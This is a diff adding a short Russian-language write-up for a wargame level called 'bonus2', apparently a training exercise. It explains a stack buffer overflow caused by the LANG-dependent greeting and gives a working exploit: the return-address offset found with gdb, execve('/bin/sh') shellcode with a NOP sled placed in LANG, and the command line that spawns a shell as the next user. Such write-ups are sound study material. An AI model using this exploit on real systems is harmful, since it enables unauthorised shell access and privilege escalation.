@@ -1,0 +1,33 @@
+программа принимает два аргумента, соединяет не более 40 символов первого
+с не более 32 символами второго, затем проверяет переменную окружающей среды
+LANG и в завиимости от ее значение также подставляет приветствляет приветствия на 
+разных языках в начало получившейся строки, если языки fi или nl, можем
+переполнить итоговую строку длинной в 72 и перезаписать return pointer, при помощи
+https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+посчитаем отступ, он равен 23 для nl:
+export LANG=nl
+run $(python -c 'print "U" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Program received signal SIGSEGV, Segmentation fault.
+0x38614137 in ?? ()
+найдем адрес нашей переменной окружающей среды:
+start
+x/200s environ
+0xbffffeef:	 "LANG=en_US.UTF-8"
+добавим 16 для попадания в nopesled: 0xbffffeff
+используем шелкод из lvl2 c nopesled длинной в 100: 
+шелкод ниже является аналогом данной этой функции и может быть получен через disas /r
+ #include <stdio.h>
+       main() {
+       char *name[2];
+       name[0] = "sh";
+       name[1] = NULL;
+       execve("/bin/sh",name,NULL);
+          }
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
+
+
+export LANG=$(python -c 'print "nl" + "\x90"*100 +"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
+./bonus2 $(python -c 'print "U" * 40') $(python -c 'print "B" * 23 + "\xff\xfe\xff\xbf"')
+$ whoami
+bonus3
+
